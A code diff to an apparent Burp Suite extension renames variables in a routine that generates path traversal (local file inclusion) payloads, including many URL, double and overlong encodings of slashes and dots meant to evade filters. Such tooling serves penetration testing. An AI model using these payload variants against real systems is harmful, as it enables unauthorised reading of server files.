@@ -381,30 +381,30 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                         listLFI.append((_upperDirectory + filePath).replace("/", "\\\\") + suffix + "\n")
                         listLFI.append((_upperDirectory + filePath).replace("/", "\\") + suffix + "\n")
 
-                replacers = ["..././", "...\\.\\"]
-                for replacer in replacers:
-                    listLFI.append(_upperDirectory.replace("../", replacer) + filePath + "\n")
+                _slashes = ["..././", "...\\.\\"]
+                for _slash in _slashes:
+                    listLFI.append(_upperDirectory.replace("../", _slash) + filePath + "\n")
 
-                replaceSlashes = ["\\", "\\\\", "\\\\\\", "//", "///", "\\/"]
-                for replaceSlash in replaceSlashes:
-                    listLFI.append(_upperDirectory.replace("/", replaceSlash) + filePath + "\n")
-                    listLFI.append(_upperDirectory.replace("/", replaceSlash) + self._txtTargetPath.text + "\n")                    
+                _slashes = ["\\", "\\\\", "\\\\\\", "//", "///", "\\/"]
+                for _slash in _slashes:
+                    listLFI.append(_upperDirectory.replace("/", _slash) + filePath + "\n")
+                    listLFI.append(_upperDirectory.replace("/", _slash) + self._txtTargetPath.text + "\n")                    
                     if "\\" in self._txtTargetPath.text:
-                        listLFI.append(_upperDirectory[:-1].replace("/", replaceSlash) + "\\" + self._txtTargetPath.text + "\n")
+                        listLFI.append(_upperDirectory[:-1].replace("/", _slash) + "\\" + self._txtTargetPath.text + "\n")
                     else:
-                        listLFI.append(_upperDirectory[:-1].replace("/", replaceSlash) + "/" + filePath + "\n")
-                    listLFI.append((_upperDirectory + filePath).replace("/", replaceSlash) + "\n")
+                        listLFI.append(_upperDirectory[:-1].replace("/", _slash) + "/" + filePath + "\n")
+                    listLFI.append((_upperDirectory + filePath).replace("/", _slash) + "\n")
 
-                delimetersSlashes = ["%2f", "%5c"   , "%252f"     , "%c0%af"      , "%u2215"      , "%u2216"      , "%u2215"      , "%u2216"      , "%c0%af"      , "%c0%5c"      , "%e0%80%af"         , "%c0%80%5c"         , "%c0%2f"    , "%252f"     , "%255c"     , "%25c0%25af"          , "%c1%9c"      , "%25c1%259c"          , "%%32%66"       , "%%35%63"       , "%uEFC8", "%uF025", "0x2f"    , "0x5c"    , "%c0%2f"      , "%c0%5c"]
-                delimetersDots = ["%2e%2e", "%2e%2e", "%252e%252e", "%c0%ae%c0%ae", "%uff0e%uff0e", "%uff0e%uff0e", "%u002e%u002e", "%u002e%u002e", "%c0%2e%c0%2e", "%c0%2e%c0%2e", "%e0%40%ae%e0%40%ae", "%e0%40%ae%e0%40%ae", "%c0ae%c0ae", "%252e%252e", "%252e%252e", "%25c0%25ae%25c0%25ae", "%c0%ae%c0%ae", "%25c0%25ae%25c0%25ae", "%%32%65%%32%65", "%%32%65%%32%65", ".."    , ".."    , "0x2e0x2e", "0x2e0x2e", "%c0%2e%c0%2e", "%c0%2e%c0%2e"]
-                for i in range(len(delimetersSlashes)):
-                    listLFI.append((_upperDirectory).replace("/", delimetersSlashes[i]) + filePath + "\n")
-                    listLFI.append((_upperDirectory)[:-1].replace("/", delimetersSlashes[i]) + "/" + filePath + "\n")
-                    listLFI.append((_upperDirectory + filePath).replace("/", delimetersSlashes[i]) + "\n")
-                    listLFI.append((_upperDirectory).replace("/", delimetersSlashes[i]).replace("..", delimetersDots[i]) + filePath + "\n")
-                    listLFI.append((_upperDirectory)[:-1].replace("/", delimetersSlashes[i]).replace("..", delimetersDots[i]) + "/" + filePath + "\n")
-                    listLFI.append((_upperDirectory + filePath).replace("/", delimetersSlashes[i]).replace("..", delimetersDots[i]) + "\n")                    
-                    listLFI.append((_upperDirectory).replace("..", delimetersDots[i]) + filePath + "\n")
+                _slashes = ["%2f", "%5c"   , "%252f"     , "%c0%af"      , "%u2215"      , "%u2216"      , "%u2215"      , "%u2216"      , "%c0%af"      , "%c0%5c"      , "%e0%80%af"         , "%c0%80%5c"         , "%c0%2f"    , "%252f"     , "%255c"     , "%25c0%25af"          , "%c1%9c"      , "%25c1%259c"          , "%%32%66"       , "%%35%63"       , "%uEFC8", "%uF025", "0x2f"    , "0x5c"    , "%c0%2f"      , "%c0%5c"]
+                _dots = ["%2e%2e", "%2e%2e", "%252e%252e", "%c0%ae%c0%ae", "%uff0e%uff0e", "%uff0e%uff0e", "%u002e%u002e", "%u002e%u002e", "%c0%2e%c0%2e", "%c0%2e%c0%2e", "%e0%40%ae%e0%40%ae", "%e0%40%ae%e0%40%ae", "%c0ae%c0ae", "%252e%252e", "%252e%252e", "%25c0%25ae%25c0%25ae", "%c0%ae%c0%ae", "%25c0%25ae%25c0%25ae", "%%32%65%%32%65", "%%32%65%%32%65", ".."    , ".."    , "0x2e0x2e", "0x2e0x2e", "%c0%2e%c0%2e", "%c0%2e%c0%2e"]
+                for i in range(len(_slashes)):
+                    listLFI.append((_upperDirectory).replace("/", _slashes[i]) + filePath + "\n")
+                    listLFI.append((_upperDirectory)[:-1].replace("/", _slashes[i]) + "/" + filePath + "\n")
+                    listLFI.append((_upperDirectory + filePath).replace("/", _slashes[i]) + "\n")
+                    listLFI.append((_upperDirectory).replace("/", _slashes[i]).replace("..", _dots[i]) + filePath + "\n")
+                    listLFI.append((_upperDirectory)[:-1].replace("/", _slashes[i]).replace("..", _dots[i]) + "/" + filePath + "\n")
+                    listLFI.append((_upperDirectory + filePath).replace("/", _slashes[i]).replace("..", _dots[i]) + "\n")                    
+                    listLFI.append((_upperDirectory).replace("..", _dots[i]) + filePath + "\n")
 
             counter = counter + 1
 
